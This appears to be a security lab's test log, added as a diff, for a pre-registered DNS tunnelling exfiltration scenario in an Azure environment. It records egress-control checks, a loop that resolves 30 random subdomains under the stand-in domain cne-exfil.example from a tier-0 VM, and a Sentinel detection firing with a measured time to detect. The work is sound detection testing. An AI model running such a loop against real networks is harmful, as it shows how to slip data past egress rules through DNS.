@@ -1,0 +1,83 @@
+### 2026-11-10 (UTC-6); times in ### lines are UTC-6; timestamps inside captured output are UTC, as the systems print them (UTC-6 = UTC minus 6 h)
+### test: scenario #4, DNS tunnelling exfiltration (T1071.004, T1048), first run, against the baseline after E1. Runbook: attack/scenarios/scenario-4-dns-tunnelling.md. Pre-registration: attack/scenarios/PREREGISTRATION.md #4 (committed 2026-11-03, before this run).
+### note: expected outcome as pre-registered: Prevented: No (no control) · Detected: Yes (detection (c) fires) · MTTD measured. Foothold vm-cne-tier0 10.101.0.4. Same build as A1 (apply 42892956270); #1 and #4 ran in one lab session.
+
+### (a) preconditions, checked before step 1 (14:26-14:28)
+### cmd: az vm run-command invoke -g rg-cne-lab -n vm-cne-hub --command-id RunShellScript --scripts 'date -u; nft list chain inet filter forward | grep t0out'
+
+Tue Nov 10 21:26:24 UTC 2026
+		ip saddr 10.101.0.0/16 ip daddr != { 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 } counter packets 0 bytes 0 log prefix "fwd-t0out-drop: " drop
+
+### note: the NVA has fwd-t0out-drop (E1), counter 0: the tier-0 NSG drops egress at the NIC, so nothing reaches the NVA rule. Second layer, as in E1.
+### cmd: az network nsg rule show -g rg-cne-lab --nsg-name nsg-tier0-workload -n DenyTier0toInternet --query "{name:name, access:access, direction:direction, priority:priority, src:sourceAddressPrefix, dst:destinationAddressPrefix}" -o table
+
+Name                 Access    Direction    Priority    Src            Dst
+-------------------  --------  -----------  ----------  -------------  --------
+DenyTier0toInternet  Deny      Outbound     100         10.101.0.0/16  Internet
+
+### note: tier-0 egress to the internet is denied (E1). This is #4's precondition: without it tier 0 could exfiltrate over HTTPS and DNS tunnelling would not be the only way out. DNS to Azure DNS (168.63.129.16) is platform traffic, not steered by UDRs and not subject to this NSG rule, so the queries still leave.
+### cmd: az resource list -g rg-cne-lab --resource-type Microsoft.Network/dnsResolverPolicies --query "[].name" -o tsv
+
+dnssp-cne-onprem
+dnssp-cne-tier0
+dnssp-cne-tier1
+dnssp-cne-tier2
+dnssp-cne-hub
+
+### cmd: DNSQueryLogs | where TimeGenerated > ago(30m) | summarize Rows = count()
+
+Rows
+----
+71
+
+### note: five DNS security policies present and DNSQueryLogs receiving data, so the DNS logging path works.
+### rule (c): Defender, Analytics, Active rules: "DNS Many Random Subdomains" Enabled (screenshot A1-active-rules.png, same build).
+
+### (b) step 1: 30 random subdomains from tier 0
+### cmd (15:29:25): az vm run-command invoke -g rg-cne-lab -n vm-cne-tier0 --command-id RunShellScript --scripts 'date -u; for i in $(seq 1 30); do n=$(head -c 25 /dev/urandom | base32 | tr -d "=" | tr "A-Z" "a-z"); getent ahostsv4 "$n.cne-exfil.example" >/dev/null; done; date -u'
+
+[stdout]
+Tue Nov 10 21:29:25 UTC 2026
+Tue Nov 10 21:29:26 UTC 2026
+
+### note: 30 names under cne-exfil.example (not owned, so each resolves to NXDOMAIN), issued in about one second. First query time 21:29:25, the MTTD start.
+
+### (c) signal 1a: the 30 names in DNSQueryLogs (raw records)
+### cmd (about 15:45): DNSQueryLogs | where SourceIpAddress in range 10.101.0.0/16 | exclude the Azure zones | project TimeGenerated, CleanQueryName, QueryType, SourceIpAddress. 30 rows for cne-exfil.example (plus two unrelated api.snapcraft.io rows from 20:15). First 6 shown; all 30 share source 10.101.0.4 and TimeGenerated 21:29:25-21:29:26.
+
+CleanQueryName                                              QueryType    SourceIpAddress    TimeGenerated
+----------------------------------------------------------  -----------  -----------------  ------------------------
+x2y2u6yu23wrgvlhslirfgqmkonsmba23qssiftf.cne-exfil.example  A            10.101.0.4         2026-11-10T21:29:25.128Z
+dnajhnipydw6lrjf5vv6l67m4ombkrdzswf57rv5.cne-exfil.example  A            10.101.0.4         2026-11-10T21:29:25.485Z
+tah7xkd74n75r37ql42omdgzdhogtuhax2jp4p62.cne-exfil.example  A            10.101.0.4         2026-11-10T21:29:25.311Z
+sgph2ifylyx2tqj4uapuyiitnt4xhhkip6zumta6.cne-exfil.example  A            10.101.0.4         2026-11-10T21:29:25.199Z
+xbadf7md2urkgqxug55z7u6dfymqdzalxo2mytlb.cne-exfil.example  A            10.101.0.4         2026-11-10T21:29:25.147Z
+5tgdhcr5l2qwyjn2e7enbtqm4ioqeek6xdkpe4vw.cne-exfil.example  A            10.101.0.4         2026-11-10T21:29:26.666Z
+
+### note: 30 distinct A-record queries, each a 40-character base32 label under cne-exfil.example, from tier 0, within one second. The only other names from tier 0 in the window are api.snapcraft.io (A and AAAA, 20:15), ordinary package traffic that the rule's length and entropy filters exclude. This is the pattern #4 produces: many long, high-entropy names under one parent.
+
+### (c) signal 1b: rule (c)'s own query matches
+### cmd (about 15:48): az monitor log-analytics query -w $WS --analytics-query "$(cat infra/detections/dns_many_random_subdomains.kql)" -o table
+
+Distinct    Parent             Queries    SourceIpAddress    TableName
+----------  -----------------  ---------  -----------------  -------------
+30          cne-exfil.example  30         10.101.0.4         PrimaryResult
+30          example.com        30         10.101.0.4         PrimaryResult
+
+### note: rule (c) matches this run: 10.101.0.4, cne-exfil.example, 30 distinct subdomains, well over the >10 threshold. The example.com row is the 11-08 S4 trigger, still within the 90-day retention: the rule file has no time filter (Sentinel bounds it by query_period, PT1H, at run time), so a manual run returns both batches. In Sentinel each run sees only the last hour, so the two do not mix. The cne-exfil.example row is this run's.
+
+### (d) signal 2 / (e) signal 3: the incident and MTTD
+### cmd (about 15:50): az monitor log-analytics query -w $WS --analytics-query "SecurityIncident | where TimeGenerated > ago(1h) | where Title == 'DNS Many Random Subdomains' | summarize arg_max(TimeGenerated, CreatedTime) by IncidentNumber | project IncidentNumber, CreatedTime | order by CreatedTime asc" -o table
+
+CreatedTime                   IncidentNumber    TableName
+----------------------------  ----------------  -------------
+2026-11-10T21:43:23.4766667Z  13                PrimaryResult
+
+### note: incident 13, from rule (c), High, Command and control. Created 21:43:23 UTC. ago(1h) and arg_max keep only this run's incident; the 11-08 S4 incidents (7-12) fall outside the hour.
+### note: MTTD = 21:43:23 - 21:29:25 = 13 min 58 s, from the first query to incident creation. Same order as S4 (11 min 41 s): DNS log ingestion plus the rule's PT10M cadence.
+### note: as in S2/S3/S4, the incident maps no entities, so its Defender priority score stays 2 (below the default queue filter). Entity mapping is a later M3 item.
+
+### result
+### Scenario #4, first run. Prevented: No. No control blocks the queries: tier-0 egress to the internet is denied (a), but DNS to Azure DNS is platform traffic that the egress rules do not cover, so all 30 queries left and were logged (c).
+### Detected: Yes. Rule (c) matched the 30 long, high-entropy subdomains under one parent (1b) and raised Sentinel incident 13. MTTD 13 min 58 s.
+### Matches the pre-registration (Prevented: No, no control presented; Detected: Yes, detection (c) fires; MTTD measured). This is the matrix's initial row for #4.
